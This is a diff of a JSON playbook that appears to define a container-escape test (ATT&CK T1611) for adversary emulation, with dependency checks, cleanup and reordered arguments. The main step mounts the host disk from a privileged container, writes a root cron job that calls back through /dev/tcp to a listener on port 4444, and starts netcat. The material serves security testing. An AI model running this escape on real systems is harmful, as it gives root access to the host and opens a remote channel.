@@ -7,305 +7,317 @@
   ],
   "steps": [
     {
-      "id": "580004ca-e032-4e5c-bf6f-8cb1a2789063",
+      "id": "a0b96e45-c175-48f2-996e-3ca5ade60342",
       "type": "execute-command",
       "data": {
-        "command": "if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi\necho -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" \u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"(hostname) \" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho \"(id)\\\" \u003e\u0026 /dev/tcp/#{listen_address}/#{listen_port} 0\u003e\u00261'\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\nnetcat -l -p #{listen_port} 2\u003e\u00261\n",
+        "command": "if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi\necho -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" \u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"(hostname) \" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho -n \"$\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\necho \"(id)\\\" \u003e\u0026 /dev/tcp/#{listen_address}/#{listen_port} 0\u003e\u00261'\" \u003e\u003e #{mount_point}#{cron_path}/#{cron_filename}\nnetcat -l -p #{listen_port} 2\u003e\u00261",
         "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "a58f8112-3d88-48b2-8ac6-15fc8f933a57",
+      "id": "34e2e030-b739-48f7-a76a-c8d234ea7724",
       "type": "execute-command",
       "data": {
-        "command": "rm #{mount_point}#{cron_path}/#{cron_filename}\numount #{mount_point}\nrmdir #{mount_point}\n",
+        "command": "rm #{mount_point}#{cron_path}/#{cron_filename}\numount #{mount_point}\nrmdir #{mount_point}",
         "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "83e1162a-aa61-4fbc-9181-21540145d03e",
+      "id": "b5e88ca1-61bc-4390-9593-b5ff01982c1b",
       "name": "Check dependency 1/5",
       "description": "Verify mount is installed.",
       "type": "execute-command",
       "data": {
-        "command": "which mount\n",
-        "command_type": ""
+        "command": "which mount",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "515ff4aa-641c-4e6f-9662-44e4388e18c2",
+      "id": "e48c8826-26ca-4d4b-88b8-d7ba9965e167",
       "name": "Resolve dependency 1/5",
       "description": "Verify mount is installed.",
       "type": "execute-command",
       "data": {
-        "command": "if [ \"\" == \"`which mount`\" ]; then echo \"mount Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install mount ; elif [ -n \"`which yum`\" ]; then sudo yum -y install mount ; fi ; else echo \"mount installed\"; fi\n",
-        "command_type": ""
+        "command": "if [ \"\" == \"`which mount`\" ]; then echo \"mount Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install mount ; elif [ -n \"`which yum`\" ]; then sudo yum -y install mount ; fi ; else echo \"mount installed\"; fi",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "f5ae4252-0042-4e62-862c-3331ff86454a",
+      "id": "36953678-9cc6-4e12-bdb4-91beeae8f813",
       "name": "Re-check dependency 1/5",
       "description": "Verify mount is installed.",
       "type": "execute-command",
       "data": {
-        "command": "which mount\n",
-        "command_type": ""
+        "command": "which mount",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "a48a93bb-47a1-4907-9582-7ad28bc12b9f",
+      "id": "0a34268d-0beb-4e91-8558-0905e8ebd90a",
       "name": "Check dependency 2/5",
       "description": "Verify container is privileged.",
       "type": "execute-command",
       "data": {
-        "command": "capsh --print | grep cap_sys_admin\n",
-        "command_type": ""
+        "command": "capsh --print | grep cap_sys_admin",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "c5fd3dbf-4fc5-485b-9e43-9a2245d809d2",
+      "id": "c82fd17e-2aa9-4ab7-85bc-aa569e68cbe7",
       "name": "Resolve dependency 2/5",
       "description": "Verify container is privileged.",
       "type": "execute-command",
       "data": {
-        "command": "if [ \"`capsh --print | grep cap_sys_admin`\" == \"\" ]; then echo \"Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n",
-        "command_type": ""
+        "command": "if [ \"`capsh --print | grep cap_sys_admin`\" == \"\" ]; then echo \"Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "ee5f5106-04a0-486b-8402-fb1de8d59189",
+      "id": "a188745e-4e05-4797-8ce8-a02bd21d8af4",
       "name": "Re-check dependency 2/5",
       "description": "Verify container is privileged.",
       "type": "execute-command",
       "data": {
-        "command": "capsh --print | grep cap_sys_admin\n",
-        "command_type": ""
+        "command": "capsh --print | grep cap_sys_admin",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "08b88982-e3e0-48f6-bf73-6b0288b28303",
+      "id": "263cbba0-5cec-4dd4-be7e-89b86b5f6788",
       "name": "Check dependency 3/5",
       "description": "Verify mount device (/dev/dm-0) exists.",
       "type": "execute-command",
       "data": {
-        "command": "ls #{mount_device}\n",
-        "command_type": ""
+        "command": "ls #{mount_device}",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "0abb917c-0ba7-4560-93bf-ccc751b36277",
+      "id": "cf007e13-1550-43dc-99eb-f7d7fbdcaac9",
       "name": "Resolve dependency 3/5",
       "description": "Verify mount device (/dev/dm-0) exists.",
       "type": "execute-command",
       "data": {
-        "command": "if [ ! -f #{mount_device} ]; then echo \"Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi\n",
-        "command_type": ""
+        "command": "if [ ! -f #{mount_device} ]; then echo \"Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true\"; fi",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "c5e41a6f-68e6-4b3a-adf3-9fc7364fad32",
+      "id": "2de41b57-be2f-4ac8-97d1-3fe07d551f38",
       "name": "Re-check dependency 3/5",
       "description": "Verify mount device (/dev/dm-0) exists.",
       "type": "execute-command",
       "data": {
-        "command": "ls #{mount_device}\n",
-        "command_type": ""
+        "command": "ls #{mount_device}",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "60923d50-799e-49bc-8803-9e24bf709cca",
+      "id": "fc844163-5c49-4b2c-a924-6d191dbad19b",
       "name": "Check dependency 4/5",
       "description": "Netcat is installed.",
       "type": "execute-command",
       "data": {
-        "command": "which netcat\n",
-        "command_type": ""
+        "command": "which netcat",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "97a4eb8e-5e79-470c-93c6-46788686ca19",
+      "id": "f833c803-4ea0-48a6-8ed3-1cc7b637ba6a",
       "name": "Resolve dependency 4/5",
       "description": "Netcat is installed.",
       "type": "execute-command",
       "data": {
-        "command": "if [ \"\" == \"`which netcat`\" ]; then echo \"netcat Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install netcat ; elif [ -n \"`which yum`\" ]; then sudo yum -y install netcat ; fi\n",
-        "command_type": ""
+        "command": "if [ \"\" == \"`which netcat`\" ]; then echo \"netcat Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install netcat ; elif [ -n \"`which yum`\" ]; then sudo yum -y install netcat ; fi",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "9acfdce7-3951-446e-89c5-08198980024c",
+      "id": "83a9da1b-0dda-4deb-a426-e0610cdc3c01",
       "name": "Re-check dependency 4/5",
       "description": "Netcat is installed.",
       "type": "execute-command",
       "data": {
-        "command": "which netcat\n",
-        "command_type": ""
+        "command": "which netcat",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "3cc4525d-0ec7-4479-a3c6-0bb3e483dede",
+      "id": "f4a9e248-9324-462e-82ee-2ddc9686e57a",
       "name": "Check dependency 5/5",
       "description": "IP Address is known.",
       "type": "execute-command",
       "data": {
-        "command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi\n",
-        "command_type": ""
+        "command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "73a25d70-f193-4f26-ad05-048e8388d103",
+      "id": "6d5ce33d-4a32-4f7c-8185-de2a13b3c08f",
       "name": "Resolve dependency 5/5",
       "description": "IP Address is known.",
       "type": "execute-command",
       "data": {
-        "command": "if [ \"\" == \"`which ifconfig`\" ]; then echo \"ifconfig Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install net=tools ; elif [ -n \"`which yum`\" ]; then sudo yum -y install net-tools ; fi\n",
-        "command_type": ""
+        "command": "if [ \"\" == \"`which ifconfig`\" ]; then echo \"ifconfig Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install net=tools ; elif [ -n \"`which yum`\" ]; then sudo yum -y install net-tools ; fi",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "e2b7ec2a-939e-4998-be8a-0caaba337357",
+      "id": "a9a97519-86d7-407f-9840-4d15bcda89cb",
       "name": "Re-check dependency 5/5",
       "description": "IP Address is known.",
       "type": "execute-command",
       "data": {
-        "command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi\n",
-        "command_type": ""
+        "command": "if [ \"#{listen_address}\" != \"\" ]; then echo \"Listen address set as #{listen_address}\" ; fi",
+        "command_type": "sh"
       },
       "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "580004ca-e032-4e5c-bf6f-8cb1a2789063",
+      "s": "a0b96e45-c175-48f2-996e-3ca5ade60342",
       "p": "on-success",
-      "o": "a58f8112-3d88-48b2-8ac6-15fc8f933a57"
+      "o": "34e2e030-b739-48f7-a76a-c8d234ea7724"
     },
     {
-      "s": "580004ca-e032-4e5c-bf6f-8cb1a2789063",
+      "s": "a0b96e45-c175-48f2-996e-3ca5ade60342",
       "p": "on-failure",
-      "o": "a58f8112-3d88-48b2-8ac6-15fc8f933a57"
+      "o": "34e2e030-b739-48f7-a76a-c8d234ea7724"
     },
     {
-      "s": "83e1162a-aa61-4fbc-9181-21540145d03e",
+      "s": "b5e88ca1-61bc-4390-9593-b5ff01982c1b",
       "p": "on-success",
-      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
+      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
     },
     {
-      "s": "83e1162a-aa61-4fbc-9181-21540145d03e",
+      "s": "b5e88ca1-61bc-4390-9593-b5ff01982c1b",
       "p": "on-failure",
-      "o": "515ff4aa-641c-4e6f-9662-44e4388e18c2"
+      "o": "e48c8826-26ca-4d4b-88b8-d7ba9965e167"
     },
     {
-      "s": "515ff4aa-641c-4e6f-9662-44e4388e18c2",
+      "s": "e48c8826-26ca-4d4b-88b8-d7ba9965e167",
       "p": "on-success",
-      "o": "f5ae4252-0042-4e62-862c-3331ff86454a"
+      "o": "36953678-9cc6-4e12-bdb4-91beeae8f813"
     },
     {
-      "s": "f5ae4252-0042-4e62-862c-3331ff86454a",
+      "s": "36953678-9cc6-4e12-bdb4-91beeae8f813",
       "p": "on-failure",
-      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
+      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
     },
     {
-      "s": "a48a93bb-47a1-4907-9582-7ad28bc12b9f",
+      "s": "0a34268d-0beb-4e91-8558-0905e8ebd90a",
       "p": "on-success",
-      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
+      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
     },
     {
-      "s": "a48a93bb-47a1-4907-9582-7ad28bc12b9f",
+      "s": "0a34268d-0beb-4e91-8558-0905e8ebd90a",
       "p": "on-failure",
-      "o": "c5fd3dbf-4fc5-485b-9e43-9a2245d809d2"
+      "o": "c82fd17e-2aa9-4ab7-85bc-aa569e68cbe7"
     },
     {
-      "s": "c5fd3dbf-4fc5-485b-9e43-9a2245d809d2",
+      "s": "c82fd17e-2aa9-4ab7-85bc-aa569e68cbe7",
       "p": "on-success",
-      "o": "ee5f5106-04a0-486b-8402-fb1de8d59189"
+      "o": "a188745e-4e05-4797-8ce8-a02bd21d8af4"
     },
     {
-      "s": "ee5f5106-04a0-486b-8402-fb1de8d59189",
+      "s": "a188745e-4e05-4797-8ce8-a02bd21d8af4",
       "p": "on-failure",
-      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
+      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
     },
     {
-      "s": "08b88982-e3e0-48f6-bf73-6b0288b28303",
+      "s": "263cbba0-5cec-4dd4-be7e-89b86b5f6788",
       "p": "on-success",
-      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
+      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
     },
     {
-      "s": "08b88982-e3e0-48f6-bf73-6b0288b28303",
+      "s": "263cbba0-5cec-4dd4-be7e-89b86b5f6788",
       "p": "on-failure",
-      "o": "0abb917c-0ba7-4560-93bf-ccc751b36277"
+      "o": "cf007e13-1550-43dc-99eb-f7d7fbdcaac9"
     },
     {
-      "s": "0abb917c-0ba7-4560-93bf-ccc751b36277",
+      "s": "cf007e13-1550-43dc-99eb-f7d7fbdcaac9",
       "p": "on-success",
-      "o": "c5e41a6f-68e6-4b3a-adf3-9fc7364fad32"
+      "o": "2de41b57-be2f-4ac8-97d1-3fe07d551f38"
     },
     {
-      "s": "c5e41a6f-68e6-4b3a-adf3-9fc7364fad32",
+      "s": "2de41b57-be2f-4ac8-97d1-3fe07d551f38",
       "p": "on-failure",
-      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
+      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
     },
     {
-      "s": "60923d50-799e-49bc-8803-9e24bf709cca",
+      "s": "fc844163-5c49-4b2c-a924-6d191dbad19b",
       "p": "on-success",
-      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
+      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
     },
     {
-      "s": "60923d50-799e-49bc-8803-9e24bf709cca",
+      "s": "fc844163-5c49-4b2c-a924-6d191dbad19b",
       "p": "on-failure",
-      "o": "97a4eb8e-5e79-470c-93c6-46788686ca19"
+      "o": "f833c803-4ea0-48a6-8ed3-1cc7b637ba6a"
     },
     {
-      "s": "97a4eb8e-5e79-470c-93c6-46788686ca19",
+      "s": "f833c803-4ea0-48a6-8ed3-1cc7b637ba6a",
       "p": "on-success",
-      "o": "9acfdce7-3951-446e-89c5-08198980024c"
+      "o": "83a9da1b-0dda-4deb-a426-e0610cdc3c01"
     },
     {
-      "s": "9acfdce7-3951-446e-89c5-08198980024c",
+      "s": "83a9da1b-0dda-4deb-a426-e0610cdc3c01",
       "p": "on-failure",
-      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
+      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
     },
     {
-      "s": "3cc4525d-0ec7-4479-a3c6-0bb3e483dede",
+      "s": "f4a9e248-9324-462e-82ee-2ddc9686e57a",
       "p": "on-success",
-      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
+      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
     },
     {
-      "s": "3cc4525d-0ec7-4479-a3c6-0bb3e483dede",
+      "s": "f4a9e248-9324-462e-82ee-2ddc9686e57a",
       "p": "on-failure",
-      "o": "73a25d70-f193-4f26-ad05-048e8388d103"
+      "o": "6d5ce33d-4a32-4f7c-8185-de2a13b3c08f"
     },
     {
-      "s": "73a25d70-f193-4f26-ad05-048e8388d103",
+      "s": "6d5ce33d-4a32-4f7c-8185-de2a13b3c08f",
       "p": "on-success",
-      "o": "e2b7ec2a-939e-4998-be8a-0caaba337357"
+      "o": "a9a97519-86d7-407f-9840-4d15bcda89cb"
     },
     {
-      "s": "e2b7ec2a-939e-4998-be8a-0caaba337357",
+      "s": "a9a97519-86d7-407f-9840-4d15bcda89cb",
       "p": "on-failure",
-      "o": "580004ca-e032-4e5c-bf6f-8cb1a2789063"
+      "o": "a0b96e45-c175-48f2-996e-3ca5ade60342"
     }
   ],
   "tags": [
     "T1611"
   ],
   "input_arguments": [
+    {
+      "name": "listen_address",
+      "type": "string",
+      "description": "IP address to listen for callback from the host system.",
+      "value": "`ifconfig eth0 | grep inet | awk '{print $2}'`"
+    },
+    {
+      "name": "listen_port",
+      "type": "integer",
+      "description": "TCP Port to listen on for callback from the host system.",
+      "value": "4444"
+    },
     {
       "name": "mount_device",
       "type": "path",
@@ -329,18 +341,6 @@
       "type": "string",
       "description": "Filename of the cron job in cron_path",
       "value": "T1611_002"
-    },
-    {
-      "name": "listen_address",
-      "type": "string",
-      "description": "IP address to listen for callback from the host system.",
-      "value": "`ifconfig eth0 | grep inet | awk '{print $2}'`"
-    },
-    {
-      "name": "listen_port",
-      "type": "integer",
-      "description": "TCP Port to listen on for callback from the host system.",
-      "value": "4444"
     }
   ]
 }
